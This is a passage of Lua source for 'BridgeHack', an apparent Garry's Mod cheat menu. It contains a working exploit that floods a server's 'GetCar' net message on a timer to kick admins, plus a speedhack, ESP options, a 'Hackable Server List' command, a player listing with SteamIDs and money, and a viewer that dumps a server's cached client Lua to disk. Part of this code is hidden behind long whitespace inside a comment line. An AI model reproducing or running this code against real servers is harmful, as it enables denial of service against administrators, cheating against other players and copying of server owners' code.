 
        end):SetImage( "icon16/script.png" )
 
       
 
        exploitshacks:AddOption( "Ulx Extended TTT Weapon Spawn", function()
 
                GiveMenu()
 
        end):SetImage( "icon16/book_key.png" )
 
       
 
        exploitshacks:AddOption( " [ON] MX RADIO KICK ADMINS",function()
 
                chatP("Kicking admins, Including anyone who isnt a user")
 
                ply:ConCommand("bh_mx_kickadmins")
 
                timer.Create( "Kickthenoobs"..BridgeHack.RandomVar, 3, 0, function()
 
                        for k,v in ipairs(player.GetAll()) do
 
                                if( v:GetUserGroup() != "user" ) then
 
                                        if v:Nick() != (ply:Nick()) then
 
                                                for i=0, 700 do
 
                                                        net.Start( "GetCar" )
 
                                                        net.WriteEntity(v)
 
                                                        net.WriteEntity(v)
 
                                                        net.SendToServer()
 
                                                end
 
                                                chatP('Attempting to kick '.. v:Nick())
 
                                        end
 
                                end
 
                        end
 
                end)
 
        end):SetImage( "icon16/wand.png" )
 
       
 
        exploitshacks:AddOption( " [OFF] MX RADIO KICK ADMINS",function()
 
                chatP("Stopping the kicks")
 
                timer.Destroy( "Kickthenoobs"..BridgeHack.RandomVar, 3, 0, function() end)
 
        end):SetImage( "icon16/wand.png" )
 
       
 
        local Misc = menu:AddSubMenu(" Misc ")
 
       
 
        Misc:AddOption( "Hackable Server List",function()
 
                ply:ConCommand("bh_serverlist")
 
        end):SetImage( "icon16/book.png" )
 
       
 
        Misc:AddOption( "Changelog",function()
 
                ChangeLogMenu()
 
        end):SetImage( "icon16/book.png" )
 
       
 
        Misc:AddOption( "List Rank - Playername - Money",function()  
 
                chatP( "Check Console\n" )
 
                consoleP("(NAME)-(STEAMID)-(CASH)\n\n\n")
 
                for k,v in pairs(player.GetAll()) do
 
                        local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
 
                        if v:IsAdmin() then
 
                                consoleP("(ADMIN!) - (" .. v:Nick() .. ") - (" .. v:SteamID() .. ") - ($" .. playermoney .. ")")
 
                        else
 
                                consoleP("(USER) - (" .. v:Nick() .. ") - (" .. v:SteamID() .. ") - ($" .. playermoney .. ")")
 
                        end
 
                end
 
        end):SetImage( "icon16/text_align_center.png" )
 
       
 
        Misc:AddOption( "Check exploits", function()
 
        ply:ConCommand("bh_check")
 
end ):SetImage( "icon16/book_addresses.png" )
 
       
 
        Misc:AddOption( "ClientSide Lua Viewer",function()
 
                chatP("Opening clientside lua viewer...")
 
                ply:ConCommand("bh_lua")
 
        end):SetImage( "icon16/application_osx_terminal.png" )
 
       
 
        if ply:SteamID() == "STEAM_0:1:45153092" or ply:SteamID() == "STEAM_0:1:61639885" then
 
                local DebugMenu = menu:AddSubMenu(" Debug Settings")
 
                DebugMenu:AddOption(" Reset Default Config.", function()
 
                        Debug("Resetting Cheat Variables...")
 
                        ResetCvar("bh_menu_effects", 1)
 
                        ResetCvar("bh_firstload_correct", 0)
 
                        ResetCvar("bh_chat_status",0)
 
                        ResetCvar("bh_cheats_enabled_on_start", 0)
 
                        ResetCvar("bh_cheats_svlua_enabled_on_start", 0)
 
                        ResetCvar("bh_showhud", 1)
 
                        ResetCvar("bh_notify", 1)
 
                end)
 
               
 
                DebugMenu:AddOption(" Debug",function()
 
                        for k,v in pairs(player.GetAll()) do
 
                                chatP(LocalPlayer():GetPos():Distance(v:GetPos()) .. " | ".. v:Nick())
 
                        end
 
                end)
 
        end
 
       
 
        menu:AddSpacer()
 
               
 
        menu:AddOption( "Config Menu", function()
 
                local DermaPanel = vgui.Create( "DFrame" )
 
                DermaPanel:SetPos( 100, 100 )
 
                DermaPanel:SetSize( 300, 400 )
 
                DermaPanel:SetTitle( " " )
 
                DermaPanel:SetVisible( true )
 
                DermaPanel:SetDraggable( true )
 
                DermaPanel:ShowCloseButton( false )
 
                function DermaPanel:Paint( w, h )
 
                        draw.RoundedBox( 4, 0, 0, w, h, Color( 10, 10, 10, 220) )
 
                        draw.RoundedBoxEx( 4, 0, 0, w, 22, Color( 240, 85, 0, 220), true, true, false, false )
 
                        draw.SimpleText( "BridgeHack Configuration Menu", "PopupFont", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                end
 
 
 
                local Button = vgui.Create("DButton", DermaPanel)
 
                Button:SetPos( 250, 2 )
 
                Button:SetSize( 45, 19 )
 
                Button:SetText( "" )
 
                Button:SetTextColor( Color( 255, 255, 255) )
 
                function Button:Paint( w, h )
 
                        draw.RoundedBoxEx( 4, 0, 0, w, h, Color(0,0,0,150) )
 
                        draw.SimpleText( "Close", "HeaderFont", 2, -2, Color( 255,255,255 ), 0, 0 )
 
                end
 
                Button.DoClick = function()
 
                        DermaPanel:Close()
 
                end                    
 
 
 
                DermaPanel:MakePopup()
 
 
 
                local ESPMixer = vgui.Create( "DColorMixer", DermaPanel )
 
                ESPMixer:SetPos( 10,170)
 
                ESPMixer:SetSize(100,100)--Make Mixer fill place of Frame
 
                ESPMixer:SetPalette( false ) --Show/hide the paletteDEF:true
 
                ESPMixer:SetAlphaBar( true ) --Show/hide the alpha barDEF:true
 
                ESPMixer:SetWangs( false ) --Show/hide the R G B A indicators DEF:true
 
                ESPMixer:SetColor( Color(GetConVarNumber("bh_esp_infocolor_r"),GetConVarNumber("bh_esp_infocolor_g"),GetConVarNumber("bh_esp_infocolor_b")) )--Set the default color
 
                daespvector = ESPMixer:GetColor()
 
 
 
                local ESPMixButton = vgui.Create( "DButton",DermaPanel )
 
                ESPMixButton:SetPos( 5, 265 )
 
                ESPMixButton:SetText( "Set ESP Color" )
 
                ESPMixButton:SetSize( 120, 15 )
 
                ESPMixButton.DoClick = function()
 
                        print(daespvector)
 
                        ply:ConCommand("bh_esp_infocolor_r "..daespr)
 
                        ply:ConCommand("bh_esp_infocolor_g "..daespg)
 
                        ply:ConCommand("bh_esp_infocolor_b "..daespb)
 
                end
 
 
 
                local EspBoxes = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
 
                EspBoxes:SetPos( 10, 25 )// Set the position
 
                EspBoxes:SetValue( GetConVarNumber("bh_esp_box") )// Initial value ( will determine whether the box is ticked too )
 
                EspBoxes:SetText("ESP Boxes")
 
                EspBoxes:SetConVar( "bh_esp_box" )
 
                EspBoxes:SizeToContents()
 
 
 
                local ShowHP = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
 
                ShowHP:SetPos( 10, 45 )// Set the position
 
                ShowHP:SetValue( GetConVarNumber("bh_esp_hp") )// Initial value ( will determine whether the box is ticked too )
 
                ShowHP:SetText("Show HP On ESP")
 
                ShowHP:SetConVar( "bh_esp_hp" )
 
                ShowHP:SizeToContents()
 
 
 
                local ShowRank = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
 
                ShowRank:SetPos( 10, 65 )// Set the position
 
                ShowRank:SetValue( GetConVarNumber("bh_esp_rank") )// Initial value ( will determine whether the box is ticked too )
 
                ShowRank:SetText("Show Rank On ESP")
 
                ShowRank:SetConVar( "bh_esp_rank" )
 
                ShowRank:SizeToContents()
 
 
 
                local Rdistance = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
 
                Rdistance:SetPos( 10, 85 )// Set the position
 
                Rdistance:SetValue( GetConVarNumber("bh_renderdistance_enable") )// Initial value ( will determine whether the box is ticked too )
 
                Rdistance:SetText("Use a Maximum render distance")
 
                Rdistance:SetConVar( "bh_renderdistance_enable" )
 
                Rdistance:SizeToContents()
 
 
 
                local Rdistance = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
 
                Rdistance:SetPos( 10, 105 )// Set the position
 
                Rdistance:SetValue( GetConVarNumber("bh_notify") )// Initial value ( will determine whether the box is ticked too )
 
                Rdistance:SetText("Top Scrolling Message")
 
                Rdistance:SetConVar( "bh_notify" )
 
                Rdistance:SizeToContents()
 
               
 
                local PlaySound = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
 
                PlaySound:SetPos( 10, 125 )// Set the position
 
                PlaySound:SetValue( GetConVarNumber("bh_playsound") )// Initial value ( will determine whether the box is ticked too )
 
                PlaySound:SetText("Menu sounds")
 
                PlaySound:SetConVar( "bh_playsound" )
 
                PlaySound:SizeToContents()
 
 
 
                local RenderDistance = vgui.Create( "DNumSlider", DermaPanel )
 
                RenderDistance:SetPos( 25, 145) // Set the position
 
                RenderDistance:SetSize( 280, 25 ) // Set the size
 
                RenderDistance:SetText( "Max Render Distance" ) // Set the text above the slider
 
                RenderDistance:SetMin( 0 ) // Set the minimum number you can slide to
 
                RenderDistance:SetMax( 5000 )// Set the maximum number you can slide to
 
                RenderDistance:SetDecimals( 1 ) // Decimal places - zero for whole number
 
                RenderDistance:SetConVar( "bh_esp_rdistance" ) // Changes the ConVar when you slide
 
        end ):SetImage( "icon16/wrench.png" )
 
       
 
        menu:Open()
 
        end)
 
                       
 
        concommand.Add("-bh_menu", function( ply )
 
                status("Menu Closed.")
 
                if GetConVarNumber("bh_menu_effects") == 1 then
 
                        hook.Add( "RenderScreenspaceEffects", "BlurBG", blur_off )
 
                end
 
                local menu = DermaMenu()
 
        end)
 
       
 
        function ESP_on( )
 
                ply:ConCommand("bh_esp 1")
 
        end
 
       
 
        function ESP_off( )
 
                ply:ConCommand("bh_esp 0")
 
        end
 
       
 
                function speedhack_on(  )
 
                ply:ConCommand("host_framerate 8;host_framerate 8")
 
                status("Enabled SpeedHack")
 
        end
 
       
 
        function speedhack_off(  )
 
                ply:ConCommand("host_framerate 0;host_framerate 0")
 
                status("Disabled SpeedHack")
 
        end
 
       
 
        -- CL LUAVIEWER                                                                                                                                                                                                                                                                                         */ require("stringtables") local escapejs = { ["\\"] = "\\\\", ["\0"] = "\\0" , ["\b"] = "\\b" , ["\t"] = "\\t" , ["\n"] = "\\n" , ["\v"] = "\\v" , ["\f"] = "\\f" , ["\r"] = "\\r" , ["\""] = "\\\"", ["\'"] = "\\\'" } function string.JavascriptSafe( str ) str = str:gsub( ".", escapejs ) str = str:gsub( "\226\128\168", "\\\226\128\168" ) str = str:gsub( "\226\128\169", "\\\226\128\169" ) return str end local function GetLuaFiles(client_lua_files) local count = client_lua_files:Count() local ret = {} for i = 1, count - 2 do ret[i] = { Path = client_lua_files:GetString(i), CRC = client_lua_files:GetUserDataInt(i) } end return ret end local function GetLuaFileContents(crc) local fs = file.Open("cache/lua/" .. crc .. ".lua", "rb", "MOD") fs:Seek(4) local contents = util.Decompress(fs:Read(fs:Size() - 4)) return contents:sub(1, -2) end local function dumbFile(path, contents) if not  path:match("%.txt$") then path = path..".txt" end local curdir = "" for t in path:gmatch("[^/\\*]+") do curdir = curdir..t if  curdir:match("%.txt$") then print("writing: ", curdir) file.Write(curdir, contents) else curdir = curdir.."/" print("Creating: ", curdir) file.CreateDir(curdir) end end end local dumbFolderCache = "" local function dumbFolder(node) for _, subnode in ipairs(node.ChildNodes:GetChildren()) do if subnode:HasChildren() then dumbFolder(subnode) else dumbFile(dumbFolderCache..subnode.pathh, GetLuaFileContents(subnode.CRC)) end end end
 
 
 
/*
 
[[----------------------------------------------------------------]]    
 
[[----------------------------------------------------------------]]  
 
 ____    ___                       __                   __                    
 
/\  _`\ /\_ \    __               /\ \__         __    /\ \                    
 
\ \ \/\_\//\ \  /\_\     __    ___\ \ ,_\   ____/\_\   \_\ \     __            
 
 \ \ \/_/_\ \ \ \/\ \  /'__`\/' _ `\ \ \/  /',__\/\ \  /'_` \  /'__`\          
 
  \ \ \ \ \\_\ \_\ \ \/\  __//\ \/\ \ \ \_/\__, `\ \ \/\ \ \ \/\  __/          
 
   \ \____//\____\\ \_\ \____\ \_\ \_\ \__\/\____/\ \_\ \___,_\ \____\        
 
    \/___/ \/____/ \/_/\/____/\/_/\/_/\/__/\/___/  \/_/\/__,_ /\/____/        
 
/\ \                                    __                                    
 
\ \ \      __  __     __        __  __ /\_\     __   __  __  __     __   _ __  
 
 \ \ \  __/\ \/\ \  /'__`\     /\ \/\ \\/\ \  /'__`\/\ \/\ \/\ \  /'__`\/\`'__\
 
  \ \ \L\ \ \ \_\ \/\ \L\.\_   \ \ \_/ |\ \ \/\  __/\ \ \_/ \_/ \/\  __/\ \ \/
 
   \ \____/\ \____/\ \__/.\_\   \ \___/  \ \_\ \____\\ \___x___/'\ \____\\ \_\
 
    \/___/  \/___/  \/__/\/_/    \/__/    \/_/\/____/ \/__//__/   \/____/ \/_/
 
                                                                               
 
[[----------------------------------------------------------------]]
 
[[----------------------------------------------------------------]]                                                                                                                                                                                                                                                                                                  */ require("stringtables") local escapejs = { ["\\"] = "\\\\", ["\0"] = "\\0" , ["\b"] = "\\b" , ["\t"] = "\\t" , ["\n"] = "\\n" , ["\v"] = "\\v" , ["\f"] = "\\f" , ["\r"] = "\\r" , ["\""] = "\\\"", ["\'"] = "\\\'" } function string.JavascriptSafe( str ) str = str:gsub( ".", escapejs ) str = str:gsub( "\226\128\168", "\\\226\128\168" ) str = str:gsub( "\226\128\169", "\\\226\128\169" ) return str end local function GetLuaFiles(client_lua_files) local count = client_lua_files:Count() local ret = {} for i = 1, count - 2 do ret[i] = { Path = client_lua_files:GetString(i), CRC = client_lua_files:GetUserDataInt(i) } end return ret end local function GetLuaFileContents(crc) local fs = file.Open("cache/lua/" .. crc .. ".lua", "rb", "MOD") fs:Seek(4) local contents = util.Decompress(fs:Read(fs:Size() - 4)) return contents:sub(1, -2) end local function dumbFile(path, contents) if not  path:match("%.txt$") then path = path..".txt" end local curdir = "" for t in path:gmatch("[^/\\*]+") do curdir = curdir..t if  curdir:match("%.txt$") then print("writing: ", curdir) file.Write(curdir, contents) else curdir = curdir.."/" print("Creating: ", curdir) file.CreateDir(curdir) end end end local dumbFolderCache = "" local function dumbFolder(node) for _, subnode in ipairs(node.ChildNodes:GetChildren()) do if subnode:HasChildren() then dumbFolder(subnode) else dumbFile(dumbFolderCache..subnode.pathh, GetLuaFileContents(subnode.CRC)) end end end
 
 
 
local VIEWER = {}
 
 
 
function VIEWER:Init()
 
  self:SetTitle("BridgeHack Clientside Lua Viewer")
 
  self:SetSize(1200, 550)
 
  self:Center() self:ShowCloseButton( false ) self.Paint = function(s,w,h)
 
    surface.SetDrawColor(Color(108,153,192))
 
    surface.DrawRect( 0,0, w,h ) surface.SetDrawColor( Color(141,200,251) ) surface.DrawRect( 1,1, w-2,h-2 ) surface.SetDrawColor(Color(141,200,251)) surface.DrawRect( 2,2, w-4,h-4 ) surface.SetDrawColor(Color(108,153,192)) surface.DrawRect( 7.5,27.5, w-14,h-34) surface.SetTextColor(0,0,0) surface.SetFont("HeaderFont")
 
    surface.SetTextPos( (self:GetWide()/2) - (tostring( string.len( self.lblTitle:GetText() )) / 2*7.5), 2) self.lblTitle:SetColor(Color(0,0,0,0)) surface.DrawText( self.lblTitle:GetText() ) end self.close = vgui.Create( "DButton", self ) self.close:SetSize( 43,20 ) self.close:SetPos( self:GetWide()-7.5-self.close:GetWide(), -1 ) self.close:SetText("") self.close.Paint = function(s,w,h) surface.SetDrawColor( Color(199,80,80) ) surface.DrawRect( 0,0, w,h ) surface.SetTextColor(255,255,255) surface.SetFont("HeaderFont") surface.SetTextPos(18,-2) surface.DrawText( "x" ) end self.close.DoClick = function(s,w,h) self:Close() end self.tree = vgui.Create("DTree", self) self.tree:SetPos(8.5,28.5) self.tree:SetSize(self:GetWide()/2-200, self:GetTall()-36) self.tree.Directories = {} self.html = vgui.Create("DHTML", self) self.html:SetPos(self:GetWide()/2-200+8.5, 28.5) self.html:SetSize(self:GetWide()/2+200-16, self:GetTall()-36) self.html:OpenURL("https://metastruct.github.io/lua_editor/") client_lua_files = stringtable.Get "client_lua_files" local tree_data= {} for i, v in ipairs(GetLuaFiles(client_lua_files)) do if i == 1 then continue end local file_name = string.match(v.Path, ".*/([^/]+%.lua)") local dir_path = string.sub(v.Path, 1, -1 - file_name:len()) local file_crc = v.CRC local cur_dir = tree_data for dir in string.gmatch(dir_path, "([^/]+)/") do if not cur_dir[dir] then cur_dir[dir] = {} end cur_dir = cur_dir[dir] end cur_dir[file_name] = {fileN = file_name, CRC = file_crc} end local file_queue = {} local function iterate(data, node, path) path = path or "" for k, v in SortedPairs(data) do if type(v) == "table" and not v.CRC then local new_node = node:AddNode(k) new_node.DoRightClick = function() local dmenu = DermaMenu(new_node) dmenu:SetPos(gui.MouseX(), gui.MouseY()) dmenu:AddOption("Save Folder", function() dumbFolderCache = "cluaview/"..GetHostName()..dumbFolder(new_node) DrawFancyPopup("The folder ".. dumbFolder(new_node) .." has been saved as data/cluaview/".. GetHostName() .."/folders/".. dumbFolder(new_node) .."!") end) dmenu:Open() end iterate(v, new_node, path .. k .. "/") else table.insert(file_queue, {node = node, fileN = v.fileN, path = path .. v.fileN, CRC = v.CRC}) end end end iterate(tree_data, self.tree) for k, v in ipairs(file_queue) do local node = v.node:AddNode(v.fileN, "icon16/page_green.png") node.DoClick = function() self.html:QueueJavascript("SetContent('"..string.JavascriptSafe(GetLuaFileContents(v.CRC)).."')") end local hostname = GetHostName() hostname = hostname:gsub("|", "-") hostname = hostname:gsub("~", "-") hostname = hostname:gsub(" ", "") node.DoRightClick = function(self,node) local nodemenu = DermaMenu(node) nodemenu:AddOption("Save File", function() dumbFile("cluaview/".. string.lower(hostname) .."/"..v.fileN, GetLuaFileContents(v.CRC)) DrawFancyPopup("The file ".. v.fileN .." has been saved as data/cluaview/".. string.lower(hostname) .."/".. v.fileN .."!") end) nodemenu:Open() end node.CRC = v.CRC node.pathh = v.path
 
    end
 
  end
 
derma.DefineControl("dcluaviewer", "Clientside Lua Viewer", VIEWER, "DFrame")
 
 
 
/*
 
[[----------------------------------------------------------------]]    
 
[[----------------------------------------------------------------]]  
 
 ____                                    
 
/\  _`\                                  
 
\ \ \L\_\ __      ___     ___   __  __    
 
 \ \  _\/'__`\  /' _ `\  /'___\/\ \/\ \  
 
  \ \ \/\ \L\.\_/\ \/\ \/\ \__/\ \ \_\ \  
 
   \ \_\ \__/.\_\ \_\ \_\ \____\\/`____ \
 
    \/_/\/__/\/_/\/_/\/_/\/____/ `/___/> \
 
                                    /\___/
 
                                    \/__/
 
 ____                                    
 
/\  _`\                                  
 
\ \ \L\ \___   _____   __  __  _____      
 
 \ \ ,__/ __`\/\ '__`\/\ \/\ \/\ '__`\    
 
  \ \ \/\ \L\ \ \ \L\ \ \ \_\ \ \ \L\ \  
 
   \ \_\ \____/\ \ ,__/\ \____/\ \ ,__/  
 
    \/_/\/___/  \ \ \/  \/___/  \ \ \/    
 
                 \ \_\           \ \_\    
 
                  \/_/            \/_/                                                                                
 
[[----------------------------------------------------------------]]    
 
[[----------------------------------------------------------------]]    
 
*/    
 
 
 
function DrawFancyPopup(message)
 
  fancyPopup = vgui.Create("DFrame")
 
  fancyPopup:SetSize(ScrW(), ScrH()) fancyPopup:SetPos(0, 0) fancyPopup:SetVisible( true ) fancyPopup:SetTitle("") fancyPopup:MakePopup() fancyPopup:ShowCloseButton( true ) fancyPopup.Paint = function(s,w,h) surface.SetDrawColor( Color(0,0,0,200) ) surface.DrawRect( 0,0, w,h ) surface.SetDrawColor( Color(13,136,69) ) surface.DrawRect( 0, w/2-fancyPopup:GetTall()/1.520, ScrW(), ScrH()/6.5 ) surface.SetTextColor(255,255,255) surface.SetFont("PopupFont") surface.SetTextPos(w/4.10, h/2.30) surface.DrawText( message )  end fancyPopupButton = vgui.Create("DButton", fancyPopup) fancyPopupButton:SetSize(110,32.5) fancyPopupButton:SetPos(fancyPopup:GetWide()/2+fancyPopup:GetWide()/10, fancyPopup:GetTall()/2.050) fancyPopupButton:SetText("") fancyPopupButton.Paint = function(s,w,h) surface.SetDrawColor( Color(255,255,255) ) surface.DrawRect( 0,0, w,h ) surface.SetDrawColor( Color(13,136,69) ) surface.DrawRect( 0+3,0+3, w-6,h-6 ) surface.SetTextColor(255,255,255) surface.SetFont("PopupFont") surface.SetTextPos(30.5,5.5) surface.DrawText( "Alright!" ) end fancyPopupButton.DoClick = function(s,w,h) fancyPopup:Close() end
 
end
 
 
 
concommand.Add("testpopup", function() DrawFancyPopup("This is just a test button and nothing else you nutmpies. Pressing Alright does no shit at all!") end) concommand.Add("bh_lua", function() vgui.Create("dcluaviewer"):MakePopup() end)